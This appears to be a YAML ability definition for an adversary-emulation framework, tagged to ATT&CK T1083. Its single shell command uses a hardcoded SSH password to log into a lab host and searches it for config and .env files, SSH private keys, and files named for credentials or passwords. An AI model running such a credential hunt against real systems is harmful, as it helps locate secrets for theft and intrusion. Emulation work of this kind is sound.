- id: disc02-file-search
  name: Sensitive File Discovery
  description: Search for sensitive files on compromised Linux hosts
  tactic: discovery
  technique:
    attack_id: T1083
    name: File and Directory Discovery
  platforms:
    linux:
      sh:
        command: |
          sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@10.0.20.21 'find / -name "*.conf" -o -name "*.env" -o -name "id_rsa" 2>/dev/null | grep -v proc | head -20; find / -name "credentials*" -o -name "password*" 2>/dev/null | grep -v proc | head -10' 2>/dev/null

  singleton: false
  repeatable: false
